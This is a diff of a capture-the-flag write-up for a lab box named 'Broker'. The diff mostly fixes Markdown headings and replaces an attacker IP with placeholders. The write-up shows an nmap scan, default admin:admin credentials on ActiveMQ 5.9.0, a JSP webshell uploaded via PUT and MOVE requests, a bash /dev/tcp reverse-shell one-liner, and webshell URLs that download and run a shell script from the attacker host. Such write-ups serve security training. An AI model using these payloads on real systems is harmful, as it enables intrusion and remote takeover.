@@ -1,6 +1,6 @@
-##Broker
+## Broker
 
-#Enumeration
+# Enumeration
 ```
 # Nmap 7.91 scan initiated Sun Mar 14 16:17:40 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,1883,8161,33559 10.10.5.130
 Nmap scan report for 10.10.5.130
@@ -32,7 +32,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Mar 14 16:19:04 2021 -- 1 IP address (1 host up) scanned in 83.63 seconds
 ```
 
-#Http Server Port 8161
+# Http Server Port 8161
 This is running ActiveMQ and has a login panel via Manage ActiveMQ broker link. Attempted to use default credentials and found that admin:admin allows access. We find the version running is quite out of date so lets look for an exploit
 ```
 # searchsploit activemq 5.9.0
@@ -116,11 +116,13 @@ Content-Length: 8
 
 test
 ```
+
 ```
 HTTP/1.1 500 /opt/apache-activemq-5.9.0/webapps/fileserver// (No such file or directory)
 Connection: close
 Server: Jetty(7.6.9.v20130131)
 ```
+
 We can then use this absolute path to move our file to the admin section where it will have execute permission
 ```
 MOVE /fileserver/test.jsp HTTP/1.1
@@ -138,6 +140,7 @@ Upgrade-Insecure-Requests: 1
 Sec-GPC: 1
 Content-Length: 0
 ```
+
 A get request will confirm we have successfully moved the webshell
 ```
 GET /admin/test.jsp HTTP/1.1
@@ -161,6 +164,7 @@ Server: Jetty(7.6.9.v20130131)
 
 ...
 ```
+
 We can now add the cmd parameter and have RCE
 ```
 GET /admin/test.jsp?cmd=ls+-la HTTP/1.1
@@ -196,11 +200,13 @@ drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:16 lib
 drwxr-sr-x 5 activemq activemq     4096 Mar 14 23:15 tmp
 drwxr-xr-x 1 activemq activemq     4096 Dec 25 18:17 webapps
 ```
+
 Let upload a bash one liner as a shell script and then try and get a shell connection via this RCE
 ```
 cat shell.sh
-bash -c "bash -i >& /dev/tcp/10.13.1.12/4242 0>&1"
-``
+bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
+```
+
 Host a webserver and curl for the file
 ```
 http://10.10.5.130:8161/admin/test.jsp?cmd=curl+10.13.1.12%3a8000/shell.sh+-o+shell.sh
@@ -211,11 +217,6 @@ http://10.10.5.130:8161/admin/test.jsp?cmd=bash+shell.sh
 ```
 We get a reverse shell back and can find the user flag
 ```
-# nc -nlvp 4242                                                                                 
-listening on [any] 4242 ...
-connect to [10.13.1.12] from (UNKNOWN) [10.10.5.130] 42380
-bash: cannot set terminal process group (1): Inappropriate ioctl for device
-bash: no job control in this shell
 activemq@activemq:/opt/apache-activemq-5.9.0$ ls -la
 ls -la
 total 9988
